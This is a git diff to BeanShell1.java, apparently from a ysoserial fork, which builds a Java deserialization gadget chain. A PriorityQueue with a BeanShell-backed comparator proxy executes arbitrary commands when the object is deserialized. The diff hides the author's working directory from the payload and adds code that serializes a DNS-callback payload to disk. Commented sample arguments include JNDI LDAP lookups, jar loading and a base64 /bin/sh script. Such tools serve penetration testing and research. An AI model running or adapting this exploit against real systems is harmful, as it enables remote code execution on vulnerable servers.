@@ -3,7 +3,10 @@ package me.gv7.woodpecker.yso.payloads;
 import bsh.Interpreter;
 import bsh.XThis;
 
+import java.io.FileOutputStream;
+import java.io.ObjectOutputStream;
 import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
 import java.util.Comparator;
 import java.util.PriorityQueue;
@@ -24,32 +27,38 @@ import me.gv7.woodpecker.yso.payloads.util.Reflections;
 public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
 
     public PriorityQueue getObject(String command) throws Exception {
-	// BeanShell payload
-    String payload = BeanShellUtil.getPayload(command);
+        // BeanShell payload
+        String payload = BeanShellUtil.getPayload(command);
 
-	// Create Interpreter
-	Interpreter i = new Interpreter();
+        // Create Interpreter
+        Interpreter i = new Interpreter();
+        /***** 覆盖bsh.cwd,清空user.dir，防止信息泄露 *****/
+        Method setu = i.getClass().getDeclaredMethod("setu",new Class[]{String.class,Object.class});
+    	setu.setAccessible(true);
+    	setu.invoke(i,new Object[]{"bsh.cwd","."});
+    	/*************************/
 
-	// Evaluate payload
-	i.eval(payload);
+        // Evaluate payload
+        i.eval(payload);
 
-	// Create InvocationHandler
-	XThis xt = new XThis(i.getNameSpace(), i);
-	InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);
+        // Create InvocationHandler
+        XThis xt = new XThis(i.getNameSpace(), i);
+        InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);
 
-	// Create Comparator Proxy
-	Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);
+        // Create Comparator Proxy
+        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);
 
-	// Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
-	final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
-	Object[] queue = new Object[] {1,1};
-	Reflections.setFieldValue(priorityQueue, "queue", queue);
-	Reflections.setFieldValue(priorityQueue, "size", 2);
+        // Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
+        final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
+        Object[] queue = new Object[] {1,1};
+        Reflections.setFieldValue(priorityQueue, "queue", queue);
+        Reflections.setFieldValue(priorityQueue, "size", 2);
 
-	return priorityQueue;
+        return priorityQueue;
     }
 
     public static void main(String[] args) throws Exception {
+        //args = new String[]{"raw_cmd:open /System/Applications/Calculator.app"};
         //args = new String[]{"sleep:10"};
         //args = new String[]{"jndi:ldap://127.0.0.1:1664/obj"};
         //args = new String[]{"loadjar:file:///Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/Calc.jar|Calc"};
@@ -58,6 +67,11 @@ public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQ
         //args = new String[]{"script_file:/Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/testfile/JavaScriptTest.js"};
         //args = new String[]{"script_base64:bmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlclsnKGphdmEubGFuZy5TdHJpbmdbXSknXShbJy9iaW4vc2gnLCctYycsJ29wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvciddKS5zdGFydCgp"};
         //args = new String[]{"upload_file_base64:/tmp/a.txt|YzBueTE="};
-        PayloadRunner.run(BeanShell1.class, args);
+        //PayloadRunner.run(BeanShell1.class, args);
+        String command = "dnslog:wewex.kfdplt.dnslog.cn";
+        Object cc6 = new BeanShell1().getObject(command);
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("/tmp/beanshell.ser"));
+        oos.writeObject(cc6);
+        oos.flush();
     }
 }
